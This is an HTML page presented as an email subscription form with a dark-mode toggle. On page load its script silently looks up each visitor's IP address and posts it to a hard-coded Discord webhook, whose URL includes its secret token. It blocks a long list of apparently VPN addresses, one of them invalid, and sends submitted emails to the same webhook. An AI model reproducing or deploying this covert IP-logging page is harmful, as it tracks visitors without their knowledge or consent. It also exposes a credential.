<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Subscription</title>
    <style>
        /* Light mode styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
            margin: 20px;
        }
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 20px;
        }
        .input-row {
            display: flex;
            gap: 10px;
        }
        .input {
            padding: 5px;
            width: 200px;
        }
        .button--submit {
            padding: 5px 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }

        /* Dark mode styles */
        body.dark-mode {
            background-color: #121212;
            color: #ffffff;
        }
        body.dark-mode .button--submit {
            background-color: #2196F3;
        }
        .toggle-button {
            margin-top: 20px;
            padding: 5px 10px;
            background-color: #555;
            color: white;
            border: none;
            cursor: pointer;
        }
        body.dark-mode .toggle-button {
            background-color: #ddd;
            color: black;
        }
    </style>
</head>
<body>
    <div class="input-group">
        <div class="input-row">
            <input type="email" class="input" id="Email" name="Email" placeholder="johndoe@gmail.com" autocomplete="off" required>
            <input class="button--submit" value="Subscribe" type="submit" onclick="sendToDiscord()">
        </div>
    </div>
    <button class="toggle-button" onclick="toggleDarkMode()">Toggle Dark Mode</button>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1317924841709637733/ejoaKCIP2qa4-9gb-U9jXQD-FkA4nEJ7eXwQexK4jkunhyVgNCLrvJ6NHWoscdU0eLCU";
         const blockedIPs = [
        "146.70.65.153",
        "149.34.242.234",
        "149.88.27.163",
        "45.85.251.160",
        "213.232.87.103",
        "91.90.122.16",
        "2001:ac8:33:8:c4fd:3c15:a8ad:7d9e",
        "154.47.25.139",
        "185.172.53.29",
        "193.142.203.174",
        "163.5.171.127",
        "37.19.205.245",
        "149.102.245.139",
        "188.126.94.69",
        "45.67.97.71",
        "190.2.132.135",
        "185.247.225.200",
        "146.70.113.108",
        "185.202.220.146",
        "86.104.23.8",
        "191.96.168.13",
        "82.102.16.179",
        "212.102.40.45",
        "185.161.202.68",
        "103.219.21.231",
        "45.154.138.55",
        "173.244.49.37",
        "45.133.7.136",
        "194.26.211.71",
        "5.62.59.16",
        "37.120.244.58",
        "98.159.33.41",
        "198.54.134.68",
        "192.145.119.44",
        "104.237.128.245",
        "172.96.166.26",
        "91.207.57.150",
        "45.39.207.159",
        "143.244.46.226",
        "2606:9580:100:d:75e7:4bf3:ca22:136e",
        "103.163.220.172",
        "84.239.16.10",
        "98.159.224.7",
        "185.251.19.165",
        "2a00:c68:0:cbd0::a01f",
        "149.50.209.168",
        "194.35.233.214",
        "79.135.105.12",
        "185.253.162.24",
        "86.48.12.148",
        "194.5.154.245",
        "185.202.221.151",
        "2001:ac8:20:c5::4",
        "212.102.45.77",
        "181.215.65.78",
        "181.215.195.78",
        "216.131.111.39",
        "195.181.170.228",
        "45.144.113.166",
        "66.115.180.236",
        "98.159.224.142",
        "212.102.36.177",
        "146.70.95.115",
        "199.33.68.57",
        "216.73.163.215",
        "91.90.120.11",
        "45.131.194.86",
        "216.131.106.138",
        "185.213.82.60",
        "92.119.36.144",
        "2001:ac8:20:c5::3",
        "193.42.96.222",
        "162.221.202.134",
        "146.70.185.99",
        "45.80.185.52",
        "2001:ac8:27:91::2f",
        "172.111.170.6",
        "193.142.203.175",
        "86.106.74.245",
        "184.75.214.165",
        "185.195.59.229",
        "84.17.42.113",
        "80.75.64.66",
        "176.125.230.24",
        "185.5.46.233",
        "91.196.220.166",
        "84.239.45.135",
        "50.114.45.112",
        "91.205.107.194",
        "146.70.51.213",
        "149.88.110.44",
        "185.245.85.133",
        "2001:ac8:33:47::3",
        "79.127.146.71",
        "149.34.242.133",
        "45.130.202.80",
        "108.171.110.136",
        "194.110.115.6",
        "77.81.139.43",
        "45.94.211.117",
        "185.187.243.97",
        "50.114.94.232",
        "103.51.140.43",
        "68.235.43.110",
        "146.70.48.4",
        "62.182.99.96",
        "79.127.146.109",
        "156.146.35.42",
        "138.199.59.201",
        "146.70.172.73",
        "2a00:1678:2470:42:41f:dac6:f08b:a6ed",
        "217.138.193.179",
        "190.2.132.140",
        "108.165.232.4",
        "104.193.135.143",
        "84.239.27.138",
        "192.166.244.123",
        "185.225.28.232",
        "198.144.145.10",
        "85.203.20.68",
        "207.204.228.134",
        "185.246.211.204",
        "45.132.224.78",
        "37.120.157.108",
        "84.239.10.137",
        "23.26.221.89",
        "41.77.117.4",
        "45.134.224.206",
        "185.108.105.181",
        "45.95.243.14",
        "103.214.47.170",
        "149.22.81.4",
        "62.12.114.54",
        "45.80.185.20",
        "45.133.7.119",
        "121.127.47.88",
        "37.120.151.124",
        "84.21.169.254",
        "37.140.254.152",
        "45.80.184.60",
        "45.86.203.234",
        "86.106.121.26",
        "95.142.127.16",
        "149.18.84.134",
        "146.70.144.71",
        "98.159.226.252",
        "203.159.81.56",
        "45.146.55.92",
        "2001:ac8:27:f:d634:30db:28a2:bd80",
        "45.131.194.159",
        "95.181.232.19",
        "79.127.149.87",
        "209.234.253.74",
        "45.155.43.172",
        "195.146.4.76",
        "2a0d:5600:d:44::a01f",
        "81.22.39.68",
        "185.211.32.196",
        "198.54.135.181",
        "45.94.208.116",
        "2.58.46.162",
        "45.83.145.17",
        "198.54.131.132",
        "152.89.204.169",
        "188.212.154.207",
        "50.114.94.33",
        "179.61.228.183",
        "5.180.62.3",
        "146.70.188.2",
        "194.34.235.53",
        "45.128.134.195",
        "92.119.36.160",
        "213.152.188.70",
        "146.70.195.99",
        "191.96.36.186",
        "45.85.248.142",
        "103.107.197.115",
        "82.149.79.3",
        "89.187.177.246",
        "149.88.105.87",
        "185.213.83.141",
        "95.214.216.3",
        "86.48.10.188",
        "149.88.22.68",
        "216.131.73.17",
        "145.14.135.40",
        "37.46.122.83",
        "102.129.143.26",
        "212.30.33.83",
        "191.101.160.145",
        "128.127.104.131",
        "192.145.116.116",
        "185.205.247.147",
        "84.239.50.16",
        "91.205.107.63",
        "103.69.224.23",
        "45.132.224.15",
        "2a02:20c8:4124::a04f",
        "173.239.218.111",
        "2a03:1b20:5:f011::10f",
        "80.67.8.199",
        "149.22.84.30",
        "154.16.157.69",
        "45.154.138.9",
        "196.44.118.101",
        "37.139.119.206",
        "194.5.48.164",
        "78.159.112.218",
        "45.152.183.195",
        "92.119.36.71",
        "149.22.88.31",
        "193.42.0.178",
        "5.182.185.169",
        "139.28.218.152",
        "45.130.202.81",
        "146.70.114.147",
        "185.47.253.200",
        "37.120.215.115",
        "108.171.108.30",
        "98.159.226.242",
        "2.56.190.53",
        "149.7.35.18",
        "36.255.205.3",
        "15.188.85.94",
        "13.40.19.238",
        "13.40.45.206",
        "13.56.164.21",
        "16.63.27.122",
        "13.246.40.209",
        "18.101.19.254",
        "146.70.17.19",
        "185.76.10.133",
        "3.248.211.50",
        "3.7.119.217",
        "15.188.193.30",
        "96.0.24.132",
        "79.127.154.71",
        "146.70.28.21",
        "36.255.205.3",
        "2.58.74.52",
        "18.133.233.297",
        "192.200.158.169",
        "5.62.58.168",
        "212.92.104.196",
        "207.204.248.91",
        "128.90.107.25",
        "84.39.151.1",
        "128.90.63.13",
        "158.58.172.153",
        "149.22.90.211",
        "209.87.169.90",
        "83.136.182.132",
        "50.114.94.165",
        "103.231.89.60",
        "45.146.55.235",
        "172.94.120.5",
        "91.205.107.229",
        "45.8.19.108",
        "103.27.224.32",
        "95.181.235.158",
        "198.44.136.158",
        "85.237.194.78",
        "149.102.233.238",
        "191.96.150.222",
        "185.159.158.199",
        "95.181.238.96",
        "194.35.121.64",
        "192.166.244.151",
        "185.215.181.122",
        "185.247.70.67",
        "103.163.220.43",
        "45.80.187.21",
        "185.216.231.136",
        "185.250.215.211",
        "185.255.128.195",
        "45.80.28.27",
        "86.62.28.109",
        "46.29.2.113",
        "128.90.177.14",
        "194.146.15.49",
        "176.67.80.150",
        "193.176.211.107",
        "193.29.107.101",
        "5.180.179.146",
        "103.137.15.45",
        "138.199.9.131",
        "154.47.20.229",
        "45.14.195.85",
        "146.70.39.142",
        "193.46.242.122",
        "84.239.43.29",
        "85.190.234.13",
        "149.36.48.145",
        "92.119.17.100",
        "193.56.252.44",
        "185.132.187.123",
        "2a02:6ea0:e813:1::f001",
        "185.141.119.135",
        "2001:1610:2:8::2",
        "149.88.97.235",
        "66.115.142.162",
        "185.192.16.53",
        "149.40.50.13",
        "45.133.5.17",
        "160.238.37.81",
        "192.253.250.37",
        "89.44.9.19",
        "193.42.96.219",
        "149.34.244.144",
        "165.231.182.138",
        "149.102.249.132",
        "85.203.21.186",
        "86.62.30.134",
        "185.218.127.68",
        "45.86.200.165",
        "2.58.74.24",
        "149.88.22.246",
        "85.190.238.69",
        "193.43.69.46",
        "146.70.196.200",
        "45.132.115.254",
        "193.36.224.107",
        "169.150.203.54",
        "45.133.182.198",
        "198.54.132.46",
        "98.159.234.115",
        "98.159.43.130",
        "94.140.11.12",
        "194.110.85.189",
        "188.126.89.116",
        "194.126.177.32",
        "103.212.227.115",
       	"5.182.110.8",
        "95.214.216.74",
        "85.190.239.41",
        "154.16.81.78",
        "185.47.253.200",
        "45.46.185.120",
        "41.32.90.221",
        "91.232.96.22",
        "46.25.24.93",
        "185.2.120.90",
        "129.252.44.90",
        "182.40.245.130",
        "112.20.140.19",
        "81.21.178.11",
        "103.73.22.12",
        "159.12.90.15",
        "18.130.245.70",
        "3.8.183.190",
	"13.40.33.26",
	"13.40.87.4",
	"13.42.17.85"
	];

        // Function to send IP to Discord
        function sendIPToDiscord(ip) {
            const payload = {
                content: `New visitor IP: ${ip}`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log("IP sent to Discord successfully!");
                } else {
                    console.error("Failed to send IP to Discord.");
                }
            })
            .catch(error => {
                console.error("Error sending IP to Discord:", error);
            });
        }

        // Function to fetch the user's IP and check against blocked IPs
        function fetchUserIP() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    console.log("User IP fetched:", ip);

                    // Check if the IP is in the blocked list
                    if (blockedIPs.includes(ip)) {
                        displayBlockedScreen(); // Show blocked screen
                    } else {
                        sendIPToDiscord(ip); // Send IP to Discord if not blocked
                    }
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });
        }

        function displayBlockedScreen() {
            // Clear the page content
            document.body.innerHTML = `
                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #121212; color: white; text-align: center;">
                    <h1 style="font-size: 2rem;">Access Denied</h1>
                    <p style="font-size: 1.2rem;">It looks like you're using a VPN or a blocked IP address.</p>
                    <p>Please disable your VPN or contact support if you believe this is an error.</p>
                </div>
            `;
        }

        // Function to send email to Discord
        function sendToDiscord() {
            const email = document.getElementById('Email').value;

            // Email validation
            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|org|net|edu|gov)$/;

            if (!emailRegex.test(email)) {
                alert("Please enter a valid email address (e.g., johndoe@gmail.com).");
                return;
            }

            const payload = {
                content: `New email subscription: ${email}`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    alert("Email sent to Discord!");
                    document.getElementById('Email').value = ""; // Clear input field
                } else {
                    alert("Failed to send email. Check your Webhook URL.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("An error occurred while sending the email.");
            });
        }

        // Dark mode toggle function
        function toggleDarkMode() {
            document.body.classList.toggle('dark-mode');

            // Save mode preference to localStorage
            const isDarkMode = document.body.classList.contains('dark-mode');
            localStorage.setItem('dark-mode', isDarkMode ? 'enabled' : 'disabled');
        }

        // Apply dark mode if previously enabled
        window.onload = function() {
            if (localStorage.getItem('dark-mode') === 'enabled') {
                document.body.classList.add('dark-mode');
            }
            fetchUserIP(); // Fetch IP on page load
        };
    </script>
</body>
</html>
